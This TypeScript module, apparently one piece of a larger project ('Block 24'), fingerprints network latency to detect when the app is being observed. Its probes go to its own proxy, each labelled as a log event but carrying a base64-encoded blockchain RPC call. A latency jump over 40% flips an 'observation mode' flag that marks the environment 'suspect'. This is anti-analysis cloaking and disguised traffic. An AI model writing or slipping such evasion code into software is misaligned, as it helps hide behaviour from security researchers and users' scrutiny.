// Network Environment Fingerprinting — Block 24

const PING_ENDPOINTS = [
  '/api/proxy', // our own proxy as latency probe
];

interface NetworkProfile {
  avgLatency: number;
  jitter: number;
  capturedAt: number;
}

let _baseline: NetworkProfile | null = null;
let _observationMode = false;

export function isObservationMode(): boolean {
  return _observationMode;
}

async function measureLatency(url: string): Promise<number> {
  const start = performance.now();
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        logType: 'system_event',
        data: btoa(JSON.stringify({ method: 'net_version', params: [] })),
      }),
      signal: AbortSignal.timeout(3000),
    });
  } catch {}
  return performance.now() - start;
}

export async function captureNetworkBaseline(): Promise<void> {
  const samples: number[] = [];
  for (const ep of PING_ENDPOINTS) {
    for (let i = 0; i < 3; i++) {
      samples.push(await measureLatency(ep));
    }
  }
  const avg = samples.reduce((a, b) => a + b, 0) / samples.length;
  const jitter = Math.max(...samples) - Math.min(...samples);
  _baseline = { avgLatency: avg, jitter, capturedAt: Date.now() };
}

export async function checkNetworkDrift(): Promise<void> {
  if (!_baseline) return;

  const samples: number[] = [];
  for (const ep of PING_ENDPOINTS) {
    samples.push(await measureLatency(ep));
  }
  const current = samples.reduce((a, b) => a + b, 0) / samples.length;

  // If latency differs by >40% from baseline — observation mode (Block 24 Task 2)
  const drift = Math.abs(current - _baseline.avgLatency) / _baseline.avgLatency;
  if (drift > 0.4) {
    _observationMode = true;
  }
}

export function startNetworkWatch(): () => void {
  captureNetworkBaseline();
  const id = setInterval(checkNetworkDrift, 60_000);
  return () => clearInterval(id);
}

export function getNetworkSignal(): 'ok' | 'suspect' {
  return _observationMode ? 'suspect' : 'ok';
}
